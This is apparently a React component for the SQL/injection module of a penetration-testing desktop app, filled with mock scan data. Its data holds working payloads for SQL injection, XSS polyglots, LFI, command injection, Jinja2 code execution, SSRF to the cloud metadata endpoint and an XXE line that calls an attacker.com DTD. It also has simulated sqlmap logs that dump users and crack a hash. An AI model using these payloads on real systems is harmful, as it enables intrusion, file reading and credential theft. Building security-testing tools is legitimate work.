// src/renderer/src/features/Tool/components/WorkspaceSection/Sqli/index.tsx
import { useState } from 'react';
import { cn } from '../../../../../shared/lib/utils';
import {
  Badge,
  KVRow,
  ModuleTabBar,
  ToolbarButton,
  LogLine,
  ActionButton,
} from '../../../../../core/components/ui';

const SectionTitle = ({ children }: { children: React.ReactNode }) => (
  <div className="text-[9.5px] font-bold text-[#3d4a61] uppercase tracking-[0.09em] pb-[5px] border-b border-[#1e2535] mb-2">
    {children}
  </div>
);

// ============================================================================
// 1. MOCK DATA (CHI TIẾT CHO SQLi / INJECTION)
// ============================================================================

interface InjectionTest {
  id: string;
  type: 'SQLi' | 'XSS' | 'SSTI' | 'LFI' | 'CMDi' | 'XXE' | 'NoSQLi' | 'SSRF';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  param: string;
  technique: string;
  db?: string;
  result: string;
  cvss: string;
  hit: boolean;
  payload: string;
  evidence: string;
}

const injectionTests: InjectionTest[] = [
  {
    id: 'i1',
    type: 'SQLi',
    severity: 'CRITICAL',
    param: 'username',
    technique: 'Union-based',
    db: 'MySQL 5.7',
    result: 'Full DB dump',
    cvss: '8.1',
    hit: true,
    payload: "admin' UNION SELECT 1,2,3,4,5,6--",
    evidence: 'Database: corp_db | Tables: users, sessions',
  },
  {
    id: 'i2',
    type: 'SQLi',
    severity: 'HIGH',
    param: 'id',
    technique: 'Blind Time-based',
    db: 'MySQL',
    result: 'Boolean extraction',
    cvss: '7.5',
    hit: true,
    payload: '1 AND IF(SUBSTRING(version(),1,1)=5,SLEEP(5),0)',
    evidence: 'Delay 5s observed',
  },
  {
    id: 'i3',
    type: 'XSS',
    severity: 'HIGH',
    param: 'comment',
    technique: 'Stored',
    db: '—',
    result: 'Alert(1) executed',
    cvss: '7.5',
    hit: true,
    payload: "<script>alert('XSS')</script>",
    evidence: 'Script injected into blog post, executed in admin panel',
  },
  {
    id: 'i4',
    type: 'SSTI',
    severity: 'HIGH',
    param: 'template',
    technique: '{{7*7}}',
    db: '—',
    result: '49 returned',
    cvss: '8.0',
    hit: true,
    payload: '{{7*7}}',
    evidence: 'Rendered as 49 → Jinja2 injection',
  },
  {
    id: 'i5',
    type: 'LFI',
    severity: 'HIGH',
    param: 'file',
    technique: 'Path traversal',
    db: '—',
    result: '/etc/passwd',
    cvss: '7.2',
    hit: true,
    payload: '../../../etc/passwd',
    evidence: 'root:x:0:0:root:/root:/bin/bash',
  },
  {
    id: 'i6',
    type: 'CMDi',
    severity: 'CRITICAL',
    param: 'ping_host',
    technique: 'Blind ; whoami',
    db: '—',
    result: 'www-data',
    cvss: '9.0',
    hit: true,
    payload: '127.0.0.1; whoami',
    evidence: 'Command output: www-data',
  },
  {
    id: 'i7',
    type: 'XXE',
    severity: 'MEDIUM',
    param: 'xml_body',
    technique: 'OOB via DTD',
    db: '—',
    result: 'File read possible',
    cvss: '6.5',
    hit: true,
    payload:
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]>',
    evidence: 'Out-of-band request received',
  },
  {
    id: 'i8',
    type: 'NoSQLi',
    severity: 'MEDIUM',
    param: 'search',
    technique: '$where injection',
    db: 'MongoDB',
    result: 'Partial data',
    cvss: '6.2',
    hit: false,
    payload: '{"$where": "this.password.length>0"}',
    evidence: 'Returns different result length',
  },
  {
    id: 'i9',
    type: 'SSRF',
    severity: 'HIGH',
    param: 'url',
    technique: 'Internal port scan',
    db: '—',
    result: 'Metadata endpoint',
    cvss: '7.8',
    hit: true,
    payload: 'http://169.254.169.254/latest/meta-data/',
    evidence: 'AWS metadata retrieved',
  },
];

// SQLMap logs (detailed)
const sqlmapLogs = [
  {
    ts: '09:45:01',
    tag: 'INFO',
    tagColor: 'cyan',
    msg: 'Target URL: https://target.corp.local/api/v1/login',
  },
  {
    ts: '09:45:02',
    tag: 'SQLi',
    tagColor: 'cyan',
    msg: "Parameter: username (POST) — testing with ' (single quote)",
  },
  {
    ts: '09:45:03',
    tag: 'CONF',
    tagColor: 'green',
    msg: "Heuristic test shows 'username' might be injectable.",
  },
  {
    ts: '09:45:04',
    tag: 'SQLi',
    tagColor: 'green',
    msg: 'Confirming UNION-based injection with 1 UNION SELECT NULL,NULL,NULL--',
  },
  { ts: '09:45:05', tag: 'DB', tagColor: 'cyan', msg: 'Back-end DBMS: MySQL >= 5.0' },
  {
    ts: '09:45:06',
    tag: 'DB',
    tagColor: 'cyan',
    msg: 'Enumerating databases: information_schema, mysql, corp_db, test',
  },
  {
    ts: '09:45:08',
    tag: 'DUMP',
    tagColor: 'red',
    msg: 'Dumping table `users` (14 rows): admin:$2y$10$abc123..., alice:$2y$10$def456..., bob:5f4dcc3b5aa765d61d8327deb882cf99',
  },
  {
    ts: '09:45:10',
    tag: 'INFO',
    tagColor: 'cyan',
    msg: 'Cracking password hash for bob: 5f4dcc3b5aa765d61d8327deb882cf99 → password123',
  },
  {
    ts: '09:45:12',
    tag: 'FILE',
    tagColor: 'amber',
    msg: 'Attempting to read /etc/passwd via load_file()',
  },
  {
    ts: '09:45:13',
    tag: 'FILE',
    tagColor: 'green',
    msg: 'Success: root:x:0:0:root:/root:/bin/bash',
  },
];

// Payload library
interface Payload {
  id: string;
  category: string;
  name: string;
  payload: string;
  description: string;
  successRate: number;
}

const payloads: Payload[] = [
  {
    id: 'p1',
    category: 'SQLi',
    name: 'Union-based (MySQL)',
    payload: "admin' UNION SELECT 1,2,3,4,5,6--",
    description: 'Extract data via UNION',
    successRate: 85,
  },
  {
    id: 'p2',
    category: 'SQLi',
    name: 'Boolean blind (MySQL)',
    payload: "admin' AND SUBSTRING(version(),1,1)=5--",
    description: 'Inference via true/false',
    successRate: 70,
  },
  {
    id: 'p3',
    category: 'SQLi',
    name: 'Time-based (MySQL)',
    payload: "admin' AND IF(1=1,SLEEP(5),0)--",
    description: 'Delay detection',
    successRate: 90,
  },
  {
    id: 'p4',
    category: 'XSS',
    name: 'Stored XSS',
    payload: "<script>alert('XSS')</script>",
    description: 'Basic alert',
    successRate: 95,
  },
  {
    id: 'p5',
    category: 'XSS',
    name: 'Polyglot XSS',
    payload:
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    description: 'Bypass multiple filters',
    successRate: 60,
  },
  {
    id: 'p6',
    category: 'LFI',
    name: 'PHP Wrapper',
    payload: 'php://filter/convert.base64-encode/resource=index.php',
    description: 'Read source code',
    successRate: 80,
  },
  {
    id: 'p7',
    category: 'CMDi',
    name: 'Command injection',
    payload: '127.0.0.1; cat /etc/passwd',
    description: 'Execute arbitrary command',
    successRate: 75,
  },
  {
    id: 'p8',
    category: 'SSTI',
    name: 'Jinja2 RCE',
    payload: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    description: 'Remote code execution',
    successRate: 65,
  },
  {
    id: 'p9',
    category: 'XXE',
    name: 'OOB File Read',
    payload:
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;%file;]>',
    description: 'Read files via external DTD',
    successRate: 55,
  },
];

// XSS polyglot results
const xssPolyglotResults = [
  {
    payload: '<img src=x onerror=alert(1)>',
    executed: true,
    context: 'HTML attribute',
    bypassedWAF: false,
  },
  {
    payload: '"><svg onload=alert(1)>',
    executed: true,
    context: 'Inside attribute',
    bypassedWAF: false,
  },
  {
    payload: '<script>alert(1)</script>',
    executed: false,
    context: 'HTML body',
    bypassedWAF: true,
    note: 'Blocked by CSP',
  },
  { payload: 'javascript:alert(1)', executed: true, context: 'URL', bypassedWAF: true },
];

// Report summary
const reportSummary = {
  totalRequests: 24850,
  successfulInjection: 9,
  extractedRows: 142,
  crackedHashes: 4,
  highValueFindings: ['admin password hash', 'database credentials', 'SSRF to metadata'],
};

// ============================================================================
// 2. UI COMPONENTS (common)
// ============================================================================

const Toolbar = ({ children }: { children: React.ReactNode }) => (
  <div className="flex items-center gap-[5px] px-[10px] h-[38px] bg-[#0f1319] border-b border-[#1e2535] shrink-0 overflow-x-auto [&::-webkit-scrollbar]:h-0">
    {children}
  </div>
);

const BADGE_BG: Record<string, string> = {
  CRITICAL: 'bg-purple-500/15 text-purple-400 border border-purple-500/25',
  HIGH: 'bg-red-500/15 text-red-400 border border-red-500/25',
  MEDIUM: 'bg-amber-500/15 text-amber-400 border border-amber-500/25',
  LOW: 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20',
};

// ============================================================================
// 3. TAB COMPONENTS
// ============================================================================

function TabInjectionTests() {
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const filtered = injectionTests.filter(
    (t) => filterSeverity === 'all' || t.severity === filterSeverity,
  );
  return (
    <div className="flex-1 overflow-auto bg-[#080a0e]">
      <div className="flex gap-1 px-3 py-1.5 bg-[#0f1319] border-b border-[#1e2535] sticky top-0">
        <button
          onClick={() => setFilterSeverity('all')}
          className={cn(
            'px-2 py-0.5 rounded text-[10px] font-semibold',
            filterSeverity === 'all'
              ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
              : 'text-[#6b7a96]',
          )}
        >
          All ({injectionTests.length})
        </button>
        <button
          onClick={() => setFilterSeverity('CRITICAL')}
          className={cn(
            'px-2 py-0.5 rounded text-[10px] font-semibold',
            filterSeverity === 'CRITICAL'
              ? 'bg-purple-500/15 text-purple-400 border border-purple-500/30'
              : 'text-[#6b7a96]',
          )}
        >
          Critical (2)
        </button>
        <button
          onClick={() => setFilterSeverity('HIGH')}
          className={cn(
            'px-2 py-0.5 rounded text-[10px] font-semibold',
            filterSeverity === 'HIGH'
              ? 'bg-red-500/15 text-red-400 border border-red-500/30'
              : 'text-[#6b7a96]',
          )}
        >
          High (5)
        </button>
      </div>
      <table className="w-full border-collapse text-[10.5px]">
        <thead className="sticky top-[33px] bg-[#0f1319] border-b border-[#1e2535]">
          <tr>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">Type</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">Param</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">Technique</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">DB</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">Result</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">CVSS</th>
            <th className="p-2 text-left text-[9.5px] text-[#3d4a61]">Evidence</th>
          </tr>
        </thead>
        <tbody>
          {filtered.map((t) => (
            <tr key={t.id} className="border-b border-[#1e2535]/50 hover:bg-white/[0.02]">
              <td className="p-2">
                <span
                  className={cn('text-[9px] font-bold px-1 py-0 rounded', BADGE_BG[t.severity])}
                >
                  {t.type}
                </span>
              </td>
              <td className="p-2 text-cyan-400 font-mono">{t.param}</td>
              <td className="p-2 text-[#6b7a96]">{t.technique}</td>
              <td className="p-2 text-[#c5cfe0]">{t.db}</td>
              <td className={cn('p-2 font-semibold', t.hit ? 'text-green-400' : 'text-amber-400')}>
                {t.result}
              </td>
              <td
                className={cn(
                  'p-2 font-bold',
                  parseFloat(t.cvss) >= 8
                    ? 'text-red-400'
                    : parseFloat(t.cvss) >= 6
                      ? 'text-amber-400'
                      : 'text-[#6b7a96]',
                )}
              >
                {t.cvss}
              </td>
              <td className="p-2 text-[#6b7a96] text-[9px] truncate max-w-[200px]">{t.evidence}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function TabDumpOutput() {
  return (
    <div className="flex-1 overflow-hidden bg-[#080a0e] flex flex-col">
      <div className="flex-1 overflow-y-auto p-3 space-y-0.5 bg-[#0f1319] font-mono">
        {sqlmapLogs.map((l, i) => (
          <LogLine key={i} ts={l.ts} tag={l.tag} tagColor={l.tagColor} msg={l.msg} />
        ))}
      </div>
      <div className="flex items-center gap-2 px-3 py-2 border-t border-[#1e2535] bg-[#0f1319] shrink-0">
        <span className="text-cyan-400 text-[11px] font-bold">sqlmap ›</span>
        <input
          className="flex-1 bg-transparent outline-none text-[#c5cfe0] text-[11px] font-mono"
          placeholder="--dbs / --dump / --os-shell / -r request.txt ..."
        />
        <ToolbarButton size="sm">Send</ToolbarButton>
      </div>
    </div>
  );
}

function TabPayloads() {
  const [category, setCategory] = useState('all');
  const filtered = payloads.filter((p) => category === 'all' || p.category === category);
  return (
    <div className="flex-1 overflow-y-auto p-3 bg-[#080a0e]">
      <div className="flex gap-1 mb-2">
        <button
          onClick={() => setCategory('all')}
          className="px-2 py-0.5 rounded text-[10px] bg-cyan-500/10 text-cyan-400"
        >
          All
        </button>
        <button
          onClick={() => setCategory('SQLi')}
          className="px-2 py-0.5 rounded text-[10px] hover:bg-[#0f1319]"
        >
          SQLi
        </button>
        <button
          onClick={() => setCategory('XSS')}
          className="px-2 py-0.5 rounded text-[10px] hover:bg-[#0f1319]"
        >
          XSS
        </button>
        <button
          onClick={() => setCategory('LFI')}
          className="px-2 py-0.5 rounded text-[10px] hover:bg-[#0f1319]"
        >
          LFI
        </button>
        <button
          onClick={() => setCategory('CMDi')}
          className="px-2 py-0.5 rounded text-[10px] hover:bg-[#0f1319]"
        >
          CMDi
        </button>
        <button
          onClick={() => setCategory('SSTI')}
          className="px-2 py-0.5 rounded text-[10px] hover:bg-[#0f1319]"
        >
          SSTI
        </button>
      </div>
      <div className="space-y-2">
        {filtered.map((p) => (
          <div key={p.id} className="bg-[#111520] border border-[#1e2535] rounded p-2">
            <div className="flex justify-between items-start">
              <span className="text-[11px] font-semibold text-cyan-400">{p.name}</span>
              <Badge color={p.successRate > 80 ? 'green' : p.successRate > 60 ? 'amber' : 'gray'}>
                {p.successRate}% success
              </Badge>
            </div>
            <div className="text-[9px] text-[#6b7a96]">{p.description}</div>
            <div className="bg-[#0f1319] rounded p-1.5 mt-1 font-mono text-[9px] text-green-400 break-all">
              {p.payload}
            </div>
            <ActionButton size="sm" variant="cyan" className="mt-1">
              Use Payload
            </ActionButton>
          </div>
        ))}
      </div>
    </div>
  );
}

function TabAdvancedConfig() {
  return (
    <div className="flex-1 overflow-y-auto p-3 bg-[#080a0e]">
      <div className="grid grid-cols-2 gap-3">
        <div className="bg-[#111520] border border-[#1e2535] rounded p-3">
          <SectionTitle>SQLMap Configuration</SectionTitle>
          <KVRow
            label="Level"
            value={
              <select className="bg-[#0f1319] border border-[#252e42] rounded px-2 py-0.5 text-[10px]">
                <option>1 (Conservative)</option>
                <option selected>2 (Default)</option>
                <option>3 (Aggressive)</option>
              </select>
            }
          />
          <KVRow
            label="Risk"
            value={
              <select className="bg-[#0f1319] border border-[#252e42] rounded px-2 py-0.5 text-[10px]">
                <option>1 (Low)</option>
                <option selected>2 (Medium)</option>
                <option>3 (High)</option>
              </select>
            }
          />
          <KVRow
            label="Threads"
            value={
              <input
                type="number"
                defaultValue="10"
                className="bg-[#0f1319] border border-[#252e42] rounded px-2 py-0.5 w-20"
              />
            }
          />
          <KVRow label="Tamper scripts" value="space2comment, between, charencode" />
          <KVRow label="Random User-Agent" value={<input type="checkbox" defaultChecked />} />
        </div>
        <div className="bg-[#111520] border border-[#1e2535] rounded p-3">
          <SectionTitle>Scan Options</SectionTitle>
          <KVRow
            label="XSS detection level"
            value={
              <select>
                <option>Low</option>
                <option selected>Medium</option>
                <option>High</option>
              </select>
            }
          />
          <KVRow label="LFI depth" value="5" />
          <KVRow label="Command injection delay" value="0.5s" />
          <KVRow label="Follow redirects" value={<input type="checkbox" defaultChecked />} />
        </div>
      </div>
    </div>
  );
}

function TabSQLMapConsole() {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([
    { ts: '10:00:00', msg: 'sqlmap v1.7.12#stable ready', level: 'info' },
  ]);
  const runCommand = () => {
    setOutput((prev) => [
      ...prev,
      { ts: new Date().toLocaleTimeString(), msg: `> ${command}`, level: 'input' },
    ]);
    setTimeout(
      () =>
        setOutput((prev) => [
          ...prev,
          {
            ts: new Date().toLocaleTimeString(),
            msg: 'Query executed successfully.',
            level: 'output',
          },
        ]),
      500,
    );
    setCommand('');
  };
  return (
    <div className="flex-1 overflow-hidden bg-[#080a0e] flex flex-col">
      <div className="flex-1 overflow-y-auto p-3 bg-[#0f1319] font-mono">
        {output.map((o, i) => (
          <div
            key={i}
            className={cn(
              'text-[10px] leading-6',
              o.level === 'input' ? 'text-cyan-400' : 'text-[#c5cfe0]',
            )}
          >
            {o.ts} {o.msg}
          </div>
        ))}
      </div>
      <div className="flex items-center gap-2 px-3 py-2 border-t border-[#1e2535] bg-[#0f1319] shrink-0">
        <span className="text-cyan-400 text-[11px]">sqlmap&gt;</span>
        <input
          value={command}
          onChange={(e) => setCommand(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && runCommand()}
          className="flex-1 bg-transparent outline-none text-[#c5cfe0] text-[11px] font-mono"
        />
        <ToolbarButton size="sm" onClick={runCommand}>
          Run
        </ToolbarButton>
      </div>
    </div>
  );
}

function TabXSSPolyglot() {
  return (
    <div className="flex-1 overflow-y-auto p-3 bg-[#080a0e]">
      <table className="w-full text-[10px] border-collapse">
        <thead className="bg-[#0f1319] border-b border-[#1e2535]">
          <tr>
            <th className="p-2">Payload</th>
            <th className="p-2">Executed</th>
            <th className="p-2">Context</th>
            <th className="p-2">Bypassed WAF</th>
            <th className="p-2">Note</th>
          </tr>
        </thead>
        <tbody>
          {xssPolyglotResults.map((r, i) => (
            <tr key={i} className="border-b border-[#1e2535]/50">
              <td className="p-2 font-mono text-[9px] text-green-400 break-all">{r.payload}</td>
              <td className="p-2">
                {r.executed ? <Badge color="green">Yes</Badge> : <Badge color="red">No</Badge>}
              </td>
              <td className="p-2">{r.context}</td>
              <td className="p-2">
                {r.bypassedWAF ? <Badge color="green">Yes</Badge> : <Badge color="gray">No</Badge>}
              </td>
              <td className="p-2 text-[#6b7a96]">{r.note}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function TabReport() {
  return (
    <div className="flex-1 overflow-y-auto p-3 bg-[#080a0e]">
      <div className="grid grid-cols-2 gap-3">
        <div className="bg-[#111520] border border-[#1e2535] rounded p-3">
          <SectionTitle>Scan Summary</SectionTitle>
          <KVRow label="Total requests" value={reportSummary.totalRequests.toString()} />
          <KVRow
            label="Successful injections"
            value={reportSummary.successfulInjection.toString()}
            valueColor="text-green-400"
          />
          <KVRow label="Extracted rows" value={reportSummary.extractedRows.toString()} />
          <KVRow label="Cracked hashes" value={reportSummary.crackedHashes.toString()} />
        </div>
        <div className="bg-[#111520] border border-[#1e2535] rounded p-3">
          <SectionTitle>High-Value Findings</SectionTitle>
          <ul className="list-disc list-inside text-[10px] text-[#c5cfe0]">
            {reportSummary.highValueFindings.map((f) => (
              <li key={f}>{f}</li>
            ))}
          </ul>
        </div>
        <div className="col-span-2">
          <ActionButton variant="cyan">Export Full Report (JSON/CSV)</ActionButton>
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// 4. MAIN EXPORT
// ============================================================================

const TABS = [
  'Injection Tests',
  'Dump Output',
  'Payloads',
  'Advanced Config',
  'SQLMap Console',
  'XSS Polyglot',
  'Report',
] as const;

export function Sqli() {
  const [activeTab, setActiveTab] = useState<string>(TABS[0]);
  return (
    <div className="flex flex-col flex-1 overflow-hidden">
      <ModuleTabBar
        tabs={TABS}
        active={activeTab}
        onTabChange={setActiveTab}
        activeColor="text-red-400 border-red-400 bg-red-500/5"
      />
      <Toolbar>
        <ToolbarButton variant="cyan">▶ Scan All</ToolbarButton>
        <ToolbarButton>SQLMap</ToolbarButton>
        <ToolbarButton>XSStrike</ToolbarButton>
        <ToolbarButton>LFI Suite</ToolbarButton>
        <ToolbarButton>CMDi Tester</ToolbarButton>
        <ToolbarButton>SSTI</ToolbarButton>
        <ToolbarButton>XXE</ToolbarButton>
        <ToolbarButton className="ml-auto">Export</ToolbarButton>
      </Toolbar>
      {activeTab === 'Injection Tests' && <TabInjectionTests />}
      {activeTab === 'Dump Output' && <TabDumpOutput />}
      {activeTab === 'Payloads' && <TabPayloads />}
      {activeTab === 'Advanced Config' && <TabAdvancedConfig />}
      {activeTab === 'SQLMap Console' && <TabSQLMapConsole />}
      {activeTab === 'XSS Polyglot' && <TabXSSPolyglot />}
      {activeTab === 'Report' && <TabReport />}
    </div>
  );
}
